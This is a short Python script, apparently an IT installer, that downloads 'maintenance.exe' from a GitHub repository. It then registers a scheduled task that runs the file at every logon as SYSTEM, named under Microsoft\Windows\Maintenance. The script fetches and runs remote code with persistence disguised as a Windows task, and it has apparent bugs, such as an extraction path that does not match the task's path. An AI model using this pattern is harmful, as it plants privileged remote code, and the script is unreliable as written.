# Importações de bibliotecas padrão
import os
import zipfile
import logging
import time
# Importações de bibliotecas de terceiros
import requests
import shutil
import subprocess
# Variaveis globais
url_maintenance = 'https://github.com/smedsarandi/remote_maintenance/raw/main/dist/maintenance.zip'
arquivo_exe = 'maintenance.exe'
arquivo_zip_destino = 'c:/Windows/Temp/maintenance.zip'
arquivo_exe_destino = 'c:/Windows/Temp/maintenance.exe'

logging.basicConfig(level=logging.INFO, filename="install.log", format="%(asctime)s - %(levelname)s - %(message)s")


def download_maintenance_exe(url):
    response = requests.get(url)
    if response.status_code == 200:
        with open(arquivo_zip_destino, 'wb') as file:
            response.raw.decode_content = True
            shutil.copyfileobj(response.raw, file)
            logging.info('arquivo baixado')
        with zipfile.ZipFile(arquivo_zip_destino, 'r') as Zip:
            logging.info(f'extraindo arquivo zip')
            Zip.extractall()
            time.sleep(5)
            os.remove(arquivo_zip_destino)

download_maintenance_exe(url=url_maintenance)

try:
    #O os.popen abre um 'terminal' e executa o comando... nesse caso ele executara o 'schtasks' que no windows é responsavel por criar tarefas
    subprocess.Popen('schtasks /create /sc ONLOGON /ru System /tr c:\Windows\Temp\maintenance.exe /tn Microsoft\Windows\Maintenance\maintenance', shell=True)
    #os.popen(rf'schtasks /create /sc ONLOGON /ru System /tr c:\Windows\Temp\maintenance.exe /tn Microsoft\Windows\Maintenance\maintenance')
    logging.info('maintenance task criada')
except:
    logging.error('maintenance task NÃO foi criada')

time.sleep(2)

#diretorio_atual = os.getcwd()